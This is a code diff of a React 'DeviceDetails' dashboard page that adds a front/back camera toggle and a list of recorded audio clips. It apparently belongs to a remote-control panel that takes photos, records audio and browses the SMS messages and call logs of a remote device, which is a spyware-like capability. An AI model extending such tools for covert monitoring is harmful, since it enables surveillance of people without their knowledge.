@@ -105,8 +105,9 @@ export default function DeviceDetails() {
   const [smsSearch, setSmsSearch] = useState("");
   const [callSearch, setCallSearch] = useState("");
 
-  // Photo viewer
+  // Photo viewer & camera toggle
   const [selectedPhoto, setSelectedPhoto] = useState(null);
+  const [activePhotoBtn, setActivePhotoBtn] = useState("back");
 
   useEffect(() => {
     fetchDevice();
@@ -1230,7 +1231,7 @@ export default function DeviceDetails() {
                   <div className="absolute top-2 right-2 flex gap-2">
                     <button
                       onClick={() => window.open(data.lastPhoto.url, "_blank")}
-                      className="p-2 bg-dark-700/80 rounded-lg hover:bg-dark-700"
+                      className="p-2 bg-dark-700/80 rounded-lg"
                     >
                       <FiExternalLink className="text-white text-sm" />
                     </button>
@@ -1238,7 +1239,7 @@ export default function DeviceDetails() {
                       onClick={() =>
                         deleteMedia("capturedPhotos", data.lastPhoto.publicId)
                       }
-                      className="p-2 bg-red-500/80 rounded-lg hover:bg-red-500"
+                      className="p-2 bg-red-500/80 rounded-lg"
                     >
                       <FiTrash2 className="text-white text-sm" />
                     </button>
@@ -1254,16 +1255,30 @@ export default function DeviceDetails() {
             )}
             <div className="grid grid-cols-3 gap-4">
               <button
-                onClick={() => sendCommand("take_photo", { camera: "back" })}
-                className="p-6 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-primary-500/30 text-center"
+                onClick={() => {
+                  setActivePhotoBtn("back");
+                  sendCommand("take_photo", { camera: "back" });
+                }}
+                className={`p-6 rounded-xl border text-center ${
+                  activePhotoBtn === "back"
+                    ? "bg-primary-500/20 border-primary-500/50"
+                    : "bg-dark-700/30 border-dark-600/50 hover:border-primary-500/30"
+                }`}
               >
                 <FiCamera className="text-3xl mx-auto mb-2 text-primary-400" />
                 <p className="font-medium text-sm">Back</p>
                 <p className="text-xs text-dark-400 mt-1">Take photo</p>
               </button>
               <button
-                onClick={() => sendCommand("take_photo", { front: true })}
-                className="p-6 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-primary-500/30 text-center"
+                onClick={() => {
+                  setActivePhotoBtn("front");
+                  sendCommand("take_photo", { camera: "front" });
+                }}
+                className={`p-6 rounded-xl border text-center ${
+                  activePhotoBtn === "front"
+                    ? "bg-purple-500/20 border-purple-500/50"
+                    : "bg-dark-700/30 border-dark-600/50 hover:border-purple-500/30"
+                }`}
               >
                 <FiCamera className="text-3xl mx-auto mb-2 text-purple-400" />
                 <p className="font-medium text-sm">Front</p>
@@ -1271,21 +1286,61 @@ export default function DeviceDetails() {
               </button>
               <button
                 onClick={() => sendCommand("record_audio", { action: "start" })}
-                className="p-6 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-primary-500/30 text-center"
+                className="p-6 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-orange-500/30 text-center"
               >
                 <FiMic className="text-3xl mx-auto mb-2 text-orange-400" />
                 <p className="font-medium text-sm">Record</p>
                 <p className="text-xs text-dark-400 mt-1">Start recording</p>
               </button>
             </div>
-            {data.recordedAudio && (
-              <div className="mt-6 p-4 rounded-xl bg-dark-700/30">
-                <p className="text-sm font-medium mb-2">Last Recording:</p>
-                <audio
-                  src={data.recordedAudio.url}
-                  controls
-                  className="w-full"
-                />
+            {(data.recordedAudios || []).length > 0 && (
+              <div className="mt-6">
+                <div className="flex items-center justify-between mb-3">
+                  <h4 className="font-medium text-sm">
+                    Recorded Audio ({data.recordedAudios.length})
+                  </h4>
+                  <button
+                    onClick={() =>
+                      deleteAllDataType("recordedAudios", "Recordings")
+                    }
+                    className="text-xs text-red-400 hover:text-red-300 flex items-center gap-1"
+                  >
+                    <FiTrash2 /> Delete All
+                  </button>
+                </div>
+                <div className="space-y-2 max-h-64 overflow-y-auto">
+                  {data.recordedAudios
+                    .slice()
+                    .reverse()
+                    .map((audio, i) => (
+                      <div
+                        key={audio.publicId || i}
+                        className="p-3 rounded-xl bg-dark-700/30"
+                      >
+                        <div className="flex items-center justify-between mb-1">
+                          <p className="text-xs text-dark-400">
+                            Recording {i + 1} ·{" "}
+                            {audio.timestamp
+                              ? new Date(audio.timestamp).toLocaleString()
+                              : ""}
+                          </p>
+                          <button
+                            onClick={() =>
+                              deleteDataItem("recordedAudios", audio.publicId)
+                            }
+                            className="text-xs text-red-400 hover:text-red-300"
+                          >
+                            <FiTrash2 />
+                          </button>
+                        </div>
+                        <audio
+                          src={audio.url}
+                          controls
+                          className="w-full h-10"
+                        />
+                      </div>
+                    ))}
+                </div>
               </div>
             )}
           </div>
